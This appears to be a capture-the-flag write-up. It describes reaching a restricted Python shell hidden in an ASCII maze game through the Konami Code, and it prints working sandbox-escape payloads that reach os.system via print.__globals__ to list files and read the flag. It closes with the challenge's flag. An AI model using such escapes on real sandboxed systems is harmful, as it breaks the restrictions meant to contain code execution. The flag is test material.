## Solution

Let's connect to the server:

\ You wake up in an unfamiliar place. Or rather, it   \
\ seems familiar but somehow... not. Like a place     \
\ you’ve visited a thousand times but now rendered in \
\ a dream. You’re in a dark corridor, your small orb  \
\ of light illuminates only the faded green linoleum  \
\ that drops away into blackness. You check your      \
\ pockets. Nothing. You’re alone.                     \
\                                                     \
\                                                     \
\ You begin to walk, only to encounter... a blank     \
\ wall. The smooth, cream facade blocks your way      \
\ abruptly. You follow it, skirting the wall closely  \
\ and discover a fork in the corridor. ‘Ok. This is a \
\ maze.’ As you pause to take stock you hear the      \
\ knocking of even footsteps. They’re growing closer. \
\ The sound is innocuous, but you feel a surge of     \
\ panic. It starts in the back of your head and       \
\ washes over you in a hot wave. You’re not sure how, \
\ but you know it is time to leave. On an instinctual \
\ level, you know. It’s time to escape...             \
\                                                     \

It's actually a fairly fun ASCII-based game:

We can go on and on, but the instructions told us to cheat, so let's try some famous cheating codes.

Guess what happens when you enter the [Konami Code](https://en.wikipedia.org/wiki/Konami_Code) (up, up, down, down, left, right, left, right, B, A and Enter):

It's a restricted shell with a character limit of 70 characters and many blocked commands:

```
\ system("ls")                                        \
\ name 'system' is not defined                        \
```

Moreover, the shell does not remember commands across attempts, so we can't make assignments to variables to bypass the length limitation.

After trying many different jailbreak commands, here are the ones that worked:

```python
print.__globals__['__builtins__'].__import__('os').system('ls')
print.__globals__['__builtins__'].__import__('os').system('cat flag')
```

The flag: `https://h4ck1ng.google/solve/7h3_s1mul4crum_i5_7rue`.
